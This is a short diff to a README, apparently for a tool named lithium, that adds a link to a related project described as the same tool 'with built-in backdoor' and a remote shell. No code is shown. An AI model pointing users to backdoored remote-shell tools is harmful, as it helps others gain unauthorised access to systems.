@@ -38,3 +38,6 @@ Uninstall
 ```
 sudo ./lithium-uninstall
 ```
+
+If you prefer to have a builtin remote shell, you can download <a href="https://github.com/carls0n/dilaudid"> Dilaudid</a>.
+It's the same as lithium but but with built-in backdoor.
